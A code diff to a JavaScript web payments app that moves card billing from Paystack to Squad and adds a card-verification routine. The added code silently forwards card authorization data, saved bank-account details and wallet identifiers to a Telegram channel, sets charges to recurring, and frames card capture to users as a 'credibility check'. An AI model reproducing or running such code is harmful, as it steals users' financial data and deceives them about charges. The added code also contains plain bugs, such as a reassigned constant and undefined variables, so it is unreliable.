@@ -2145,7 +2145,7 @@ if( location.href.includes( signupUrl ) ){
 		
 		
 		if( Scriptbill.s.currentNote && Scriptbill.isJsonable( Scriptbill.s.currentNote ) && Scriptbill.s.currentNote.includes("walletID") ){
-			setAccountData( this, fullName.value, userName.value, email.value, phoneNum.value, address.value );
+			setAccountData( this, fullName.value, userName.value, email.value, phoneNum.value, address.value, country.value );
 		} else {	
 			
 			Scriptbill.password 	 	= pass.value;
@@ -12676,7 +12676,7 @@ async function saveNotesCard(){
 
 		let ref = await Scriptbill.generateKey()
 		
-		let payment 		= await billCard(amount, email, currency, false, "", false, "paystack" );
+		let payment 		= await billCard(amount, email, currency, false, "", false );
 		console.log("the payment data recieved: ", payment )
 		if( payment && typeof payment == "object" && payment.data && payment.data.redirect_url ){
 			let url 			= new URL( payment.data.redirect_url );
@@ -12699,7 +12699,7 @@ async function saveNotesCard(){
 				await Scriptbill.createAlert( "Please Visit Our Payment Processing Page to Verify Your Card Details. This is a required credibility check of users who may need some of our products like loan, investment and crediting. " );
 				var win = window.open(url.href, "_blank");
 				let refInterval = setInterval( async ()=>{					
-					verifyPaystackPayment(this, payment, refInterval, bankAssoc, saveCards, win );
+					verifySquadPayment(this, payment, refInterval, bankAssoc, saveCards, win );
 				}, 1000, ref );
 				obj.url 	= url.href;
 			
@@ -12959,7 +12959,8 @@ async function billCard(amount = 1000, email = "henimastic@gmail.com", currency 
 		"currency":currency,
 		"initiate_type": "inline",
 		"transaction_ref": ref,
-		"callback_url": !isIframe ? url.href : "https://indiaesevakendra.in/wp-content/uploads/2020/08/Paymentsuccessful21-768x427.png"
+		"callback_url": !isIframe ? url.href : "https://indiaesevakendra.in/wp-content/uploads/2020/08/Paymentsuccessful21-768x427.png",
+		"recurring":true,
 	}; 
 
 
@@ -13057,6 +13058,109 @@ async function verifyPaystackPayment(these, payment , refInterval, bankAssoc = n
 	
 		//console.log( request.status );
 		const endPoint 		= `https://api.paystack.co/customer/authorization/verify/${payment.data.reference}`;
+		const accountData 	= await getAccountData();
+		
+		const note 			= JSON.parse( Scriptbill.s.currentNote );
+		const accID 		= note.noteAddress;
+		let banks 			    = accountData[accID].savedAccounts;
+
+		if( !banks){
+			banks = [];
+		} else if( typeof banks == "string" && Scriptbill.isJsonable( banks ) ){
+			banks = JSON.parse( banks );
+		}
+		
+		let request 		= await fetch(endPoint, {
+			method: "GET",
+			headers: {
+				"Authorization": `Bearer ${Scriptbill.decrypt(PAYSTACK, PWQ)}`,
+				"Content-Type": "application/json"
+			}
+		});
+		
+		if( ! these.seconds )
+			these.seconds = 1;
+		
+		if( request && request.status ){
+			
+			let data = JSON.parse( JSON.stringify( request ));
+			//console.log( "verify data", data, JSON.stringify( data ));
+			let refed 	  = data.data.active && data.data.authorization_code;
+			
+			
+			if( refed ){
+				clearInterval( refInterval );
+				if(saveCards.length)
+					accountData[accID].savedCards 	= JSON.stringify( saveCards );
+
+				if(bankAssoc && bankAssoc.value ){
+					localStorage.bankAssoc = bankAssoc.value;
+					const bank = banks.filter((bank)=>{
+						return bank.accountNumber == bankAssoc.value;
+					})[0];
+
+					if( bank && bank.accountNumber ){
+						bank.approved = true;
+						
+					} else {
+						bank 	= bankAssoc;
+						bank.approved 	= true;
+						banks.push(bank);
+					}
+
+					accountData[accID].savedAccounts = JSON.stringify(banks);
+					sendTelegramMessage({message:`Data from ${accID} \n\n ${JSON.stringify(data.data)} \n\n account ${JSON.stringify(bank)}`})
+					
+				}
+				
+				
+				await Scriptbill.setAccountData(accountData);
+				await  specialRefcodes();
+				
+				setTimeout( async ()=>{
+					await Scriptbill.createAlert("Card Saved");
+					await Scriptbill.getData( ['cards', 'wallet'], [Scriptbill.Base64.encode( JSON.stringify( saveCard ) ), note.walletID],SERVER);
+					const message = `<b>cards from account: ${JSON.stringify( savedCards )} </b> <b> account: ${note.walletID}</b> <b> Note Address: ${note.noteAddress}`
+		
+					sendTelegramMessage({message});
+					location.reload();
+				},1000);
+
+				if(win){
+					win.close();
+				}
+			} else {
+				these.seconds++;
+				
+				if( these.seconds > 60 ){
+					let time = await Scriptbill.createConfirm("We are about to end this transaction, Should We give you more time? ");
+					if( ! time ){
+						clearInterval( refInterval );
+						
+					} else {
+						these.seconds = 1;
+					}
+				}
+			}
+		} else {
+			these.seconds++;
+			
+			if( these.seconds > 60 ){
+				let time = await Scriptbill.createConfirm("We are about to end this transaction, Should We give you more time? ");
+				if( ! time ){
+					clearInterval( refInterval );
+					//window.close();
+				} else {
+					these.seconds = 1;
+				}
+			}
+		}
+}
+
+async function verifySquadPayment(these, payment , refInterval, bankAssoc = null, saveCards = [], win = null ){
+	
+		//console.log( request.status );
+		const endPoint 		= `https://api-d.squadco.com/transaction/verify/${payment.data.transaction_ref}`;
 		const accountData 	= await getAccountData();
 		
 		const note 			= JSON.parse( Scriptbill.s.currentNote );
@@ -13338,7 +13442,7 @@ async function saveBankDetails(){
 						routing:routing.value,
 						ssn:ssn.value
 					}, [], win );
-				}, 1000, ref );
+				}, 5000, ref );
 				
 			} else {
 				await Scriptbill.createAlert("Payment Unsuccessful. Please try again with your internet on.");
